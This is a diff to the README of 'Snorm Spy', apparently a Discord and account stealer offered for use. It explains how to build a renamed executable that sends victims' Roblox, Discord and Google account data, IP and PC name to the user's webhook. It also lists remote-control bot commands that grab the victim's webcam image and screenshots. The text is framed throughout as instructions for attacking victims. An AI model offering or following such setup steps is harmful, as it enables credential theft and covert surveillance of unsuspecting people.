@@ -6,7 +6,10 @@ Snorm Spy, Normal Discord Stealer.
 # HOW TO USE. 
 
 
-DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN builder.bat, ONCE IT DOWNLOADS. RIGHT CLICK ON MAIN.PY AND REPLACE "sex" ( yes Silly put sex as the placeholder ) WITH THE YOUR WEBHOOK URL, AND REPLACE THE OTHER "sex" WITH YOUR BOT TOKEN. ONCE THE FILE IS OPENED AND THE VICTIM HAS DOWNLOADED THE MODULES, ALL THEY HAVE TO DO IS OPEN THE FILE, THEIR ROBLOX, IP, PC NAME, DISCORD, AND GOOGLE ACCOUNT INFORMATION GET SENT TO YOUR WEBHOOK. THE BOT IS SIMPLY USED FOR THE CONTROL CENTER. THE BOT COMMANDS CONSIST OF : 
+DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for it to download. Then open setup.py, put it in your webhook url and your bot token. It will then build the stealer and a new py file called built_main will be made. Once the file is made, "built_main" will be made but as an exe file, you can rename the exe file and if anyone opens the file, they get grabbed.
+
+
+# THE BOT COMMANDS CONSIST OF : 
 
 1. !webcam -- Take an image of the webcam and send it
 2. !screenshot -- Takes an screenshot of the victims monitor and send it
